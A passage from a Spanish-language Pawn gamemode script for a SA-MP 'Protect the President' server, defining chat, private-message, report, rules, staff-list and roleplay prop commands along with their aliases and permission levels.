	TextDrawFont(TextPAP[1], 2);
	TextDrawLetterSize(TextPAP[1], 0.300000, 1.500000);
	TextDrawColor(TextPAP[1], -1);
	TextDrawSetOutline(TextPAP[1], 1);
	TextDrawSetProportional(TextPAP[1], 1);

	TextSpree[1] = TextDrawCreate(482.000000, 417.000000, "~w~lleva una buena racha");
	TextDrawBackgroundColor(TextSpree[1], 255);
	TextDrawFont(TextSpree[1], 3);
	TextDrawLetterSize(TextSpree[1], 0.379999, 1.200000);
	TextDrawColor(TextSpree[1], -1);
	TextDrawSetOutline(TextSpree[1], 1);
	TextDrawSetProportional(TextSpree[1], 1);

	TextSpree[2] = TextDrawCreate(462.000000, 432.000000, "10 asesinatos sin morir");
	TextDrawBackgroundColor(TextSpree[2], 255);
	TextDrawFont(TextSpree[2], 3);
	TextDrawLetterSize(TextSpree[2], 0.379999, 1.200000);
	TextDrawColor(TextSpree[2], -1);
	TextDrawSetOutline(TextSpree[2], 1);
	TextDrawSetProportional(TextSpree[2], 1);
	return 1;
}

alias:comandos("cmds");
alias:kill("morir");
alias:rc("clase", "cambiarequipo", "cambiarclase");
alias:apoyo("backup", "bu", "ayuda");
alias:ej("eject", "ejecutar");
alias:racha("spree");
alias:reportar("report");
alias:holiday("fiesta");
alias:detener("apagar", "stop");
alias:staff("admins");

alias:anuncio("announce");
alias:anuncio2("announce2");
alias:anuncio3("announce3");
alias:darequipo("setteam");
alias:darnivel("setlevel");
alias:prohibir("ban");
alias:rprohibir("rban");
alias:desprohibir("unban", "desban");
alias:nombreon("nameon");
alias:holidayon("fiestaon");
alias:ir("goto");
alias:traer("get");
alias:advertir("warn");
alias:expulsar("kick");
alias:decir("say");
alias:espiar("spec");
alias:noespiar("specoff");

//Alias VIP
alias:guardarskin("saveskin");
alias:quitarskin("resetskin");
alias:ruedas("wheels");
alias:nitro("nos");
alias:armas("weapons");
alias:pinturas("paints");
alias:guardarcolor("savecolor");
alias:quitarcolor("resetcolor");
alias:guardarnos("savenos");
alias:hidraulicos("h", "savehydraulics");
alias:guardarrueda("savewheels");
alias:quitarrueda("resetwheels");

flags:tl(CMD_LEVEL_1);
flags:rol(CMD_LEVEL_1);
flags:tpmcolor(CMD_LEVEL_1);
flags:ej(CMD_LEVEL_1);
flags:cigarro(CMD_LEVEL_1);
flags:vino(CMD_LEVEL_1);
flags:cerveza(CMD_LEVEL_1);
flags:racha(CMD_LEVEL_1);
flags:showspree(CMD_LEVEL_1);
flags:hidespree(CMD_LEVEL_1);
flags:pk(CMD_LEVEL_1);
flags:pka(CMD_LEVEL_1);
flags:r(CMD_LEVEL_1);
flags:sipm(CMD_LEVEL_1);
flags:nopm(CMD_LEVEL_1);

flags:nitro(CMD_VIP_VEHICLE);
flags:ruedas(CMD_VIP_VEHICLE);
flags:pinturas(CMD_VIP_VEHICLE);
flags:ccolor(CMD_VIP_VEHICLE);
flags:cc(CMD_VIP_VEHICLE);
flags:guardarcolor(CMD_VIP_VEHICLE);
flags:autotune(CMD_VIP_VEHICLE);

flags:vcmds(CMD_VIP);
flags:vskin(CMD_VIP);
flags:mskin(CMD_VIP);
flags:guardarskin(CMD_VIP);
flags:quitarskin(CMD_VIP);
flags:decir(CMD_VIP);
flags:colt45(CMD_VIP);
flags:sniper(CMD_VIP);
flags:rifle(CMD_VIP);
flags:kata(CMD_VIP);
flags:saw(CMD_VIP);
flags:vipme(CMD_VIP);
flags:armas(CMD_VIP);
flags:vset(CMD_VIP);
flags:quitarcolor(CMD_VIP);
flags:guardarnos(CMD_VIP);
flags:hidraulicos(CMD_VIP);
flags:guardarrueda(CMD_VIP);
flags:quitarrueda(CMD_VIP);

flags:mcmds(CMD_MOD);
flags:holidayon(CMD_MOD);
flags:anuncio(CMD_MOD);
flags:darequipo(CMD_MOD);
flags:ir(CMD_MOD);
flags:traer(CMD_MOD);
flags:advertir(CMD_MOD);
flags:cancion(CMD_MOD);
flags:loquendo(CMD_MOD);
flags:expulsar(CMD_MOD);
flags:espiar(CMD_MOD);
flags:noespiar(CMD_MOD);
flags:jetpack(CMD_MOD);
flags:slap(CMD_MOD);
flags:ip(CMD_MOD);

flags:acmds(CMD_ADMIN);
flags:anuncio2(CMD_ADMIN);
flags:anuncio3(CMD_ADMIN);
flags:darnivel(CMD_ADMIN);
flags:prohibir(CMD_ADMIN);
flags:rprohibir(CMD_ADMIN);
flags:desprohibir(CMD_ADMIN);
flags:fakechat(CMD_ADMIN);
flags:godmode(CMD_ADMIN);
flags:nsay(CMD_ADMIN);
flags:nombreon(CMD_ADMIN);

cmd:musica(playerid, params[])
{
	if(!(params[0] != '\0'))
	{
	    SendClientMessage(playerid, Rojo, "USO: /musica [URL en .mp3]");
	    SendClientMessage(playerid, Rojo, "* Puedes entrar a esta página: www.onlinevideoconverter.com para convertir tu música a .mp3");
		return 1;
	}
	PlayAudioStreamForPlayer(playerid, params);
	return 1;
}

cmd:detener(playerid)
{
    StopAudioStreamForPlayer(playerid);
    return 1;
}

cmd:rol(playerid, params[])
{
	if(params[0] == '\0')
	{
	    SendClientMessage(playerid, Rojo, "USO: /rol [mensaje]");
	    return 1;
	}
	if(AntiSpam(playerid, params)) return 1;
	new string[128];
	new name[24];
	GetPlayerName(playerid, name, 24);
	format(string, sizeof(string), "[%s]* %s dice: %s", GetTeamName(playerid), name, params);
	SendClientMessageToAll(GetTeamColor(playerid), string);
	return 1;
}

cmd:tpm(playerid, params[])
{
	if(params[0] == '\0')
	{
		SendClientMessage(playerid, Rojo, "USO: /tpm [mensaje]");
		SendClientMessage(playerid, Rojo, "* También puedes hablar con ![texto]");
		return 1;
	}
	if(AntiSpam(playerid, params)) return 1;
	new string[128];
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "[Team Chat] %s: %s", name, params);
	foreach(new i : Player)
	{
		if(IsPlayerInClassSelection(i) != 1)
		{
			switch(Data[playerid][Teams])
			{
				case PRESIDENT..SWAT:
				{
					if(!(Data[i][TeamPresident] == 0)) continue;
					SendClientMessage(i, Data[i][TPMColor], string);
				}
				case TERRO:
				{
					if(!(Data[i][Teams] == TERRO)) continue;
					SendClientMessage(i, Data[i][TPMColor], string);
				}
				case CIVIL:
				{
					if(!(Data[i][Teams] == CIVIL)) continue;
					SendClientMessage(i, Data[i][TPMColor], string);
				}
			}
		}
	}
	return 1;
}

cmd:comandos(playerid)
{
	new cmds_nivel0[2962];
	strcat(cmds_nivel0, "Lista de comandos para los jugadores que no están registrados dentro del servidor:\n\n");
	strcat(cmds_nivel0, "* /duelo - Le permite invitar a un jugador a un duelo 1 contra 1, sólo se puede usar como civil\n");
	strcat(cmds_nivel0, "* /verduelo - Te permite ver el duelo que está actualmente en progreso\n");
	strcat(cmds_nivel0, "* /cduelo - Cancela tu invitación que hayas enviado a otro jugador\n");
	strcat(cmds_nivel0, "* /sduelo - Te permite salir del duelo\n");
	strcat(cmds_nivel0, "* /carrera - Te permite crear una carrera, sólo se puede usar como civil\n");
	strcat(cmds_nivel0, "* /entrar - Te permite unirte a cualquier carrera que se haya creado, sólo se puede usar como civil\n");
	strcat(cmds_nivel0, "* /salir - Te permite salir de una carrera\n");
	strcat(cmds_nivel0, "* /topkills - Te muestra una lista con los 5 primeros jugadores con mejores asesinatos\n");
	strcat(cmds_nivel0, "* /toptimes - Te muestra una lista con los 5 mejores tiempos que ha sucedido en una carrera\n");
	strcat(cmds_nivel0, "* /kill o /morir - Mata a tu personaje para que puedas reaparecer\n");
	strcat(cmds_nivel0, "* /sync -  Refresca tu personaje, principalmente utilizado para eliminar cualquier error\n");
	strcat(cmds_nivel0, "* /stats o /cuenta -  Le permite ver sus estadísticas actuales del juego y también de los demás\n");
	strcat(cmds_nivel0, "* /reglas - Muestra una lista de reglas que debe seguir\n");
	strcat(cmds_nivel0, "* /niveles - Te dice qué representa cada nivel de jugador\n");
	strcat(cmds_nivel0, "* /reportar - Le permite informar a los administradores de cualquier regla que no se haya cumplido\n");
	strcat(cmds_nivel0, "* /duda - Te permite enviar alguna duda o inquietud que tengas sobre el modo de juego\n");
	strcat(cmds_nivel0, "* /register - Le permite crear una cuenta en nuestro servidor, debe jugar al menos 10 minutos antes de poder registrarse\n");
	strcat(cmds_nivel0, "* /creditos - Muestra un diálogo donde te dice quién fue el que creó el modo de juego\n");
	strcat(cmds_nivel0, "* /rc o /clase - Le permite cambiar de clase, ya sea para ser Presidente, VicePresidente, etc\n");
	strcat(cmds_nivel0, "* /cskin - Le permite cambiar su skin a unos pocos seleccionados que son únicos para cada clase\n");
	strcat(cmds_nivel0, "* /camara - Te da una cámara para tomar fotos\n");
	strcat(cmds_nivel0, "* /para - Te da un paracaídas gratis\n");
	strcat(cmds_nivel0, "* /staff o /admins - Te permite ver la lista de administradores actuales que estén en línea\n");
	strcat(cmds_nivel0, "* /vips - Muestra todos los VIP actuales en línea\n");
	strcat(cmds_nivel0, "* /deber - Abre un diálogo y te dice cual es tu objetivo principal dentro del juego\n");
	strcat(cmds_nivel0, "* /pm -  Le permite enviar un mensaje privado a cualquier jugador\n");
	strcat(cmds_nivel0, "* /holiday o /fiesta -  Te proporciona un rifle, 3 granadas y 500 municiones de spray\n");
	strcat(cmds_nivel0, "* /mapa - Te dice el mapa actual en el juego\n");
	strcat(cmds_nivel0, "* /timeleft - Muestra la cantidad de tiempo que queda antes de que el presidente sobreviva\n");
	strcat(cmds_nivel0, "* /presidente - Te dice quién es el actual presidente\n");
	strcat(cmds_nivel0, "* /vicepresidente - Te dice quién es el actual vicepresidente\n");
	strcat(cmds_nivel0, "* /intel - Te muestra al presidente actual y algo de información sobre él\n");
	strcat(cmds_nivel0, "* /apoyo, /bu o /backup - Envía un mensaje de ayuda a todos los policías y seguridad\n");
	strcat(cmds_nivel0, "  Este comando sólo es para la clase de presidente\n\n");
	strcat(cmds_nivel0, "* /gafas - Te pone unas gafas en los ojos de tu skin (piel)\n");
	strcat(cmds_nivel0, "* /TPM - Te permite enviar un mensaje que solo tu equipo puede ver\n");
	strcat(cmds_nivel0, "* /musica - Te permite poner una música que sólo la escucharás tú\n");
	strcat(cmds_nivel0, "* /detener - Te permite detener cualquier tipo de música\n");
	strcat(cmds_nivel0, "Con ![texto] hablas por el chat de equipo. Ejemplo: !Hola");
	ShowPlayerDialog(playerid, DIALOG_CMDS_1, DIALOG_STYLE_MSGBOX, "Comandos Nivel 0", cmds_nivel0, ">>", "Cerrar");
	return 1;
}

cmd:creditos(playerid)
{
	new string[330];
	strcat(string, "Creador & Fundador: MrDave\n");
	strcat(string, "Scripter: MrDave\n");
	strcat(string, "Hoster: Marcelo_Reyes\n\n");
	strcat(string, "- Testers:\n");
	strcat(string, "José Liscano\n");
	strcat(string, "Zetayder\n");
	strcat(string, "Agustín Zavala\n");
	strcat(string, "William Rojas\n");
	strcat(string, "Nahuel_Martino\n\n");
	strcat(string, "- Colaboradores en includes:\n");
	strcat(string, "SA-MP Team (a_samp)\n");
	strcat(string, "Cueball (a_zones)\n");
	strcat(string, "urShadow (Pawn.CMD)\n");
	strcat(string, "Y_Less (sscanf,YSI)\n");
	strcat(string, "Kye (mSelection)\n");
	strcat(string, "Gryphus One (OnPlayerPause)\n");
    ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Créditos", string, "Cerrar", "");
	return 1;
}
cmd:niveles(playerid)
	return ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Niveles", "Nivel 0: Jugador no registrado\nNivel 1: Jugador registrado\nNivel 2: VIP\nNivel 3: Moderador\nNivel 4: Administrador\nNivel 5: Dueño", "Cerrar", "");
cmd:reglas(playerid)
{
	new reglas[1622];
	strcat(reglas, "Aquí tienes una lista de reglas que debes seguir si quieres jugar aquí. Si te saltas serás sancionado.\n\n");
	strcat(reglas, "* No usar hacks/cheats\n");
	strcat(reglas, "* Prohibido jugar con el AFK para evadir kill\n");
	strcat(reglas, "* Prohibido jugar con el comando /nombre\n");
	strcat(reglas, "* Prohibido insultar o usar algún vocabulario no adecuado con los demás jugadores\n");
	strcat(reglas, "* Prohibido hacer Drive-By shooting usando la Desert Eagle\n");
	strcat(reglas, "* Sí algún administrador te da alguna advertencia, lo debes tomar de la mejor manera\n");
	strcat(reglas, "* No disparar a miembros del mismo equipo o a jugadores que estén protegido por la protección spawn\n");
	strcat(reglas, "* Sí estás protegido bajo la protección de spawn, no puedes causarle daño a ningún jugador\n");
	strcat(reglas, "* Prohibido forzar el cambio de mapa\n");
	strcat(reglas, "* No falsificar nicks para suplantar la identidad\n");
	strcat(reglas, "* No hacer bromas con el comando /q\n");
	strcat(reglas, "* El equipo que proteja al presidente no debe hacer carjack estando un presidente dentro del vehículo\n");
	strcat(reglas, "* No hacer publicidad, no anunciar otros servidores ni saturar el chat\n");
	strcat(reglas, "* Los civiles no pueden usar Hydras\n");
	strcat(reglas, "* Los miembros del equipo Seguridad deben cumplir con su deber de acompañar al Presidente\n");
	strcat(reglas, "* El Presidente no puede estar en la área de spawn para evitar ser matado\n");
	strcat(reglas, "* El Presidente y el Vice-Presidente no pueden viajar en el mismo vehículo\n");
	strcat(reglas, "* El Presidente no puede manejar aviones o helicópteros\n");
	strcat(reglas, "* No saltarse los 15 minutos de espera para ser presidente o vice-presidente de nuevo\n");
	//strcat(reglas, "* No está permitido bugs como el c-bug, 2-shooting, entre otros (sólo en duelos se puede hacer)\n");
	strcat(reglas, "* Está prohibido interrumpir o molestar a jugadores que estén dentro de un duelo");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "Protege al Presidente - Reglas", reglas, "Cerrar", "");
	return 1;
}

cmd:cskin(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) == 1)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede usar este comando estando en un vehículo.");
	if(Data[playerid][Teams] == PRESIDENT || Data[playerid][Teams] == VICEPRESIDENT)
		 return SendClientMessage(playerid, Rojo, "ERROR: El Presidente y VicePresidente no pueden cambiarse de skin.");
	if(strcmp(GetTeamName(playerid), "Policía", false) == 0)
	{
        ShowModelSelectionMenu(playerid, Skin_Class[E_SKINCLASS:(Data[playerid][Teams]-3)], "Policia");
		return 1;
	}
	ShowModelSelectionMenu(playerid, Skin_Class[E_SKINCLASS:(Data[playerid][Teams]-3)], GetTeamName(playerid));
	return 1;
}

cmd:reportar(playerid, params[])
{
	if(Data[playerid][Level] >= 3)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede usar este comando.");
	if(sscanf(params, "ds", params[0], params[1]))
		return SendClientMessage(playerid, Rojo, "USO: /reportar [playerid] [razón]");
	if(!(IsPlayerConnected(params[0]) != 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	if(Data[params[0]][Level] >= 3)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede reportar a un administrador.");
	if(!(params[0] != playerid))
		return SendClientMessage(playerid, Rojo, "ERROR: No te puedes reportar a ti mismo.");
	new string[100];
	new Count = 0;
	new name1[24];
	new name2[24];
	GetPlayerName(playerid, name1, sizeof(name1));
	GetPlayerName(params[0], name2, sizeof(name2));
	format(string, sizeof(string), "%s(%d) reportó a %s(%d) [Razón: %s].", name1, playerid, name2, params[0], params[1]);
	foreach(new i : Player)
	{
		if(Data[i][Level] >= 3)
		{
			++Count;
			SendClientMessage(i, Rojo, string);
		}
	}
	if(Count == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay administradores conectados para enviar el reporte.");
	GameTextForPlayer(playerid, "REPORTE ENVIADO", 5000, 4);
	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
	return 1;
}

cmd:pm(playerid, params[])
{
	if(sscanf(params, "ds", params[0], params[1]))
	    return SendClientMessage(playerid, Rojo, "USO: /pm [playerid] [mensaje]");
	if(!(IsPlayerConnected(params[0]) != 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	if(!(params[0] != playerid))
		return SendClientMessage(playerid, Rojo, "ERROR: No te puedes enviar un mensaje privado a ti mismo.");
	if(Data[params[0]][PM] == false)
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador tiene los mensajes privados desactivados.");
    if(AntiSpam(playerid, params)) return 1;
	UltimoID_PM[params[0]] = playerid;
	SetPlayerMessagePM(playerid, params[0], params[1]);
	return 1;
}

cmd:r(playerid, params[])
{
	if(params[0] == '\0')
		return SendClientMessage(playerid, Rojo, "USO: /r [mensaje]");
	if(UltimoID_PM[playerid] == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, Rojo, "ERROR: Nadie te ha enviado un mensaje privado.");
	if(IsPlayerConnected(UltimoID_PM[playerid]) != 1)
	{
	    UltimoID_PM[playerid] = INVALID_PLAYER_ID;
	    SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	    return 1;
	}
	if(Data[UltimoID_PM[playerid]][PM] == false)
	{
	    UltimoID_PM[playerid] = INVALID_PLAYER_ID;
	    SendClientMessage(playerid, Rojo, "ERROR: Ese jugador tiene los mensajes privados desactivados.");
	    return 1;
	}
	if(AntiSpam(playerid, params)) return 1;
	SetPlayerMessagePM(playerid, UltimoID_PM[playerid], params);
	UltimoID_PM[UltimoID_PM[playerid]] = playerid;
	return 1;
}

/*
Si la matriz Data[playerid][PM] guarda:
- El valor de "true" significa que los mensajes privados están activados, esto quiere decir que los jugadores podrán enviar un mensaje privado al jugador que tenga ese valor guardado.
- El valor de "false" significa que los mensajes privados están desactivados, esto quiere decir que los jugadores no podrán enviar un mensaje privado al jugador que tenga ese valor guardado.
*/

cmd:sipm(playerid)
{
	if(Data[playerid][PM] == true)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted ya tiene los mensajes privados activados.");
	Data[playerid][PM] = true;
	GameTextForPlayer(playerid, "PM ACTIVADO", 5000, 4);
	SendClientMessage(playerid, 0xFF8000FF, "PM: Ahora los jugadores podrán enviarte un mensaje privado.");
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:nopm(playerid)
{
	if(Data[playerid][PM] == false)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted ya tiene los mensajes privados desactivados");
	Data[playerid][PM] = false;
	GameTextForPlayer(playerid, "PM DESACTIVADO", 5000, 4);
	SendClientMessage(playerid, 0xFF8000FF, "PM: Ahora los jugadores no podrán enviarte un mensaje privado.");
	PlayerPlaySound(playerid, 1139, 0, 0, 0);
	return 1;
}

cmd:duda(playerid, params[])
{
	if(Data[playerid][Level] >= 3)
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede usar este comando.");
	if(isnull(params))
		return SendClientMessage(playerid, Rojo, "USO: /duda [mensaje]");
	if(strlen(params) > 40)
		return SendClientMessage(playerid, Rojo, "ERROR: La cantidad máxima del mensaje es de 40 caracteres.");
	new Count = 0;
	new string[100];
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(string, sizeof(string), "%s(%d) tiene una duda: ¿%s?", name, playerid, params);
	foreach(new i : Player)
	{
		if(Data[i][Level] >= 3)
		{
		    ++Count;
			SendClientMessage(i, Amarillo, string);
		}
	}
	if(Count == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay administradores conectados para enviar la duda.");
	GameTextForPlayer(playerid, "DUDA ENVIADA", 5000, 4);
	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
	return 1;
}

cmd:vips(playerid)
{
	new len[(41*10)+2];
	new string[28];
	new title[16];
	new Count = 0;
	new name[24];
	strcat(len, "Nombre\tID\n");
	foreach(new i : Player)
	{
		if(Data[i][Level] == 2)
		{
		    GetPlayerName(i, name, sizeof(name));
		    ++Count;
			format(string, sizeof(string), "%s\t%d\n", name, i);
			strcat(len, string);
		}
	}
	format(title, sizeof(title), "VIP Online: %d", Count);
	if(Count == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay usuarios VIP conectados.");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_TABLIST_HEADERS, title, len, "Cerrar", "");
	return 1;
}

cmd:staff(playerid)
{
	new len[(69*10)+2];
	new string[42];
	new title[18];
	new name[24];
	new AdminID[10] = {INVALID_PLAYER_ID, ...};
	new Count = 0;
	new i = 0;
	new j = -1;
	new aux = 0;
	strcat(len, "Nombre\tID\tNivel\tRango\n");
	foreach(i : Player)
	{
		if(Data[i][Level] >= 3)
		{
		    if(Count < 10)
		    {
				++j;
				++Count;
				AdminID[j] = i;
			}
		}
	}
	for(i = 0; i < Count; ++i)
	{
	    for(j = 0; j < Count; ++j)
	    {
	        if(j+1 == Count) break;
	        if(Data[AdminID[j]][Level] < Data[AdminID[j+1]][Level])
	        {
	            aux = AdminID[j];
	            AdminID[j] = AdminID[j+1];
	            AdminID[j+1] = aux;
	        }
	    }
	}
	for(i = 0; i < Count; ++i)
	{
 		GetPlayerName(AdminID[i], name, sizeof(name));
		format(string, sizeof(string), "%s\t%d\t%d\t%s\n", name, AdminID[i], Data[AdminID[i]][Level], GetRankName(AdminID[i]));
		strcat(len, string);
	}
	format(title, sizeof(title), "STAFF Online: %d", Count);
	if(Count == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay ningún miembro del STAFF conectado.");
	ShowPlayerDialog(playerid, 5, DIALOG_STYLE_TABLIST_HEADERS, title, len, "Cerrar", "");
	return 1;
}

cmd:kill(playerid)
{
	if(!(Data[playerid][Teams] != PRESIDENT))
		return SendClientMessage(playerid, Rojo, "ERROR: El presidente no puede suicidarse.");
	if(!(IsPlayerInAnyVehicle(playerid) == 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Usted no puede estar en un vehículo para usar este comando.");
	SetPlayerHealth(playerid, 0.0);
	return 1;
}

cmd:camara(playerid)
	return GivePlayerWeapon(playerid, 43, 1);
cmd:para(playerid)
	return GivePlayerWeapon(playerid, 46, 1);
cmd:tpmcolor(playerid)
{
	ShowPlayerDialog(playerid, DIALOG_TPMCOLOR, DIALOG_STYLE_LIST, "Colores (Team Chat)", "Amarillo\nRojo\nVerde\nNaranja\nAzul\nMorado\nCafé\nRosado\nBlanco\nGris", "Seleccionar", "Cerrar");
	return 1;
}
cmd:gafas(playerid)
{
	if(!(IsPlayerAttachedObjectSlotUsed(playerid, 0) == 0))
		return SendClientMessage(playerid, Rojo, "ERROR: Ya tienes una gafa.");
	SetPlayerAttachedObject(playerid,0,19138,2,0.094000,0.041999,0.000000,90.000015,82.000000,-0.199999,1.000000,1.000000,1.000000);
	return 1;
}

cmd:pk(playerid, params[])
{
	if(!(IsPlayerInAnyVehicle(playerid) == 1))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes estar dentro de un vehículo para usar este comando.");
	if(!(GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes ser el conductor para usar este comando.");
	if(sscanf(params, "d", params[0]))
		return SendClientMessage(playerid, Rojo, "USO: /pk [playerid]");
	if(!(IsPlayerConnected(params[0]) == 1))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra conectado.");
	if(!(GetPlayerVehicleID(playerid) == GetPlayerVehicleID(params[0])))
		return SendClientMessage(playerid, Rojo, "ERROR: Ese jugador no se encuentra en tu vehículo.");
	new str[25 + 24];
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(str, sizeof(str), "* %s te sacó de su vehículo", name);
	SendClientMessage(params[0], 0xFF8000FF, str);
	RemovePlayerFromVehicle(params[0]);
	return 1;
}

cmd:pka(playerid)
{
	if(!(IsPlayerInAnyVehicle(playerid) == 1))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes estar dentro de un vehículo para usar este comando.");
	if(!(GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
		return SendClientMessage(playerid, Rojo, "ERROR: Debes ser el conductor para usar este comando.");
	new str[25 + 24];
	new passengers = 0;
	new vehicleid = GetPlayerVehicleID(playerid);
	new name[24];
	GetPlayerName(playerid, name, sizeof(name));
	format(str, sizeof(str), "* %s te sacó de su vehículo", name);
	foreach(new i : Player)
	{
		if(!((vehicleid == GetPlayerVehicleID(i)) && (i != playerid))) continue;
		++passengers;
		SendClientMessage(i, 0xFF8000FF, str);
		RemovePlayerFromVehicle(i);
	}
	if(passengers == 0)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay ningún pasajero en tu vehículo.");
	format(str, sizeof(str), "* Haz sacado a %d %s de tu vehículo", passengers, ((passengers == 1) ? ("pasajero") : ("pasajeros")));
	SendClientMessage(playerid, 0xFF8000FF, str);
	return 1;
}

cmd:apoyo(playerid)
{
	if(!(Data[playerid][Teams] == PRESIDENT))
		return SendClientMessage(playerid, Rojo, "ERROR: Este comando sólo lo puede usar el Presidente.");
	if(Data[playerid][TiempoApoyo] > gettime())
		return SendClientMessage(playerid, Rojo, "ERROR: Debes esperar 30 segundos para volver a usar este comando.");
	new str[70 + MAX_PLAYER_NAME + MAX_ZONE_NAME];
	new namezone[MAX_ZONE_NAME];
	new name[24];
	new Float:X;
	new Float:Y;
	new Float:Z;
	GetPlayer2DZone(playerid, namezone, MAX_ZONE_NAME);
	GetPlayerName(id_president, name, sizeof(name));
	//MAX_PLAYER_NAME = 24, MAX_ZONE_NAME = 28
	Data[playerid][TiempoApoyo] = gettime() + 30;
	foreach(new i : Player)
	{
		if(!((IsPlayerInClassSelection(i) == 0) && (Data[i][TeamPresident] == 0))) continue;
		if(!(IsPlayerInAnyVehicle(i) == 0))
			GetVehiclePos(GetPlayerVehicleID(i), X, Y, Z);
		else
			GetPlayerPos(i, X, Y, Z);
		format(str, sizeof(str), "[URGENTE] El Presidente %s solicita respaldo en %s (Distancia: %0.2f m)", name, namezone, GetPlayerDistanceFromPoint(playerid, X, Y, Z));
		SendClientMessage(i, 0xFF2040FF, str);
	}
	return 1;
}

cmd:cigarro(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted debe bajarse del vehículo para poder fumar un cigarro.");
	if(GetPlayerSpecialAction(playerid) == 21)
		return SendClientMessage(playerid, Rojo, "ERROR: Ya tienes un cigarro.");
	SetPlayerSpecialAction(playerid, 21);
	SendClientMessage(playerid, 0x97FF2FFF, "* Presiona la tecla 'ENTER' para quitar el cigarro de tu mano.");
	return 1;
}

cmd:vino(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted debe bajarse del vehículo para poder tomar un rico vino.");
	if(GetPlayerSpecialAction(playerid) == 22)
		return SendClientMessage(playerid, Rojo, "ERROR: Ya tienes un vino.");
	SetPlayerSpecialAction(playerid, 22);
	SendClientMessage(playerid, 0x97FF2FFF, "* Presiona la tecla 'ENTER' para quitar el vino de tu mano.");
	SendClientMessage(playerid, 0x97FF2FFF, "* Sí te encuentras borracho, aplasta la tecla 'N' para estar sano de nuevo.");
	return 1;
}

cmd:cerveza(playerid)
{
	if(IsPlayerInAnyVehicle(playerid) != 0)
	    return SendClientMessage(playerid, Rojo, "ERROR: Usted debe bajarse del vehículo para poder tomar una rica cerveza.");
	if(GetPlayerSpecialAction(playerid) == 23)
		return SendClientMessage(playerid, Rojo, "ERROR: Ya tienes una cerveza.");
	SetPlayerSpecialAction(playerid, 23);
	SendClientMessage(playerid, 0x97FF2FFF, "* Presiona la tecla 'ENTER' para quitar la cerveza de tu mano.");
	return 1;
}

cmd:showspree(playerid)
{
	if(MayorRacha < 2)
		return SendClientMessage(playerid, Rojo, "ERROR: Actualmente no hay rachas tan altas para mostrar.");
	if(MostrarRachas[playerid] == true)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ya se mostró la mejor racha de asesinatos en un textdraw.");
	MostrarRachas[playerid] = true;
	TextDrawShowForPlayer(playerid, TextSpree[0]);
	TextDrawShowForPlayer(playerid, TextSpree[1]);
	TextDrawShowForPlayer(playerid, TextSpree[2]);
	return 1;
}

cmd:hidespree(playerid)
{
	if(MayorRacha < 2)
		return SendClientMessage(playerid, Rojo, "ERROR: Actualmente no hay rachas tan altas para ocultar.");
 	if(MostrarRachas[playerid] == false)
	    return SendClientMessage(playerid, Rojo, "ERROR: Ya se quitó el textdraw donde decía la mejor racha de asesinatos.");
	MostrarRachas[playerid] = false;
	TextDrawHideForPlayer(playerid, TextSpree[0]);
	TextDrawHideForPlayer(playerid, TextSpree[1]);
	TextDrawHideForPlayer(playerid, TextSpree[2]);
	return 1;
}

cmd:mapa(playerid)
{
	new str[28];
	format(str, sizeof(str), "* Mapa actual: %s", GetMapName(City));
	SendClientMessage(playerid, 0x97FF2FFF, str);
	return 1;
}

cmd:vicepresidente(playerid)
{
	if(id_vicepresident == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay un VicePresidente actualmente.");
	new str[33 + 24];
	new name[24];
	GetPlayerName(id_vicepresident, name, sizeof(name));
	format(str, sizeof(str), "* VicePresidente actual: %s (ID: %d)", name, id_vicepresident);
	SendClientMessage(playerid, 0x97FF2FFF, str);
	return 1;
}

cmd:presidente(playerid)
{
	if(id_president == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay un Presidente actualmente.");
	new str[70 + 24];
	new name[24];
	GetPlayerName(id_president, name, sizeof(name));
	format(str, sizeof(str), "* Presidente actual: %s (ID: %d) | También use /intel para más información.", name, id_president);
	SendClientMessage(playerid, 0x97FF2FFF, str);
	return 1;
}

cmd:intel(playerid)
{
	if(id_president == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, Rojo, "ERROR: No hay un Presidente actualmente.");
	new str[67 + MAX_VEHICLE_NAME + MAX_ZONE_NAME];
	new zone[MAX_ZONE_NAME];
	new name[24];
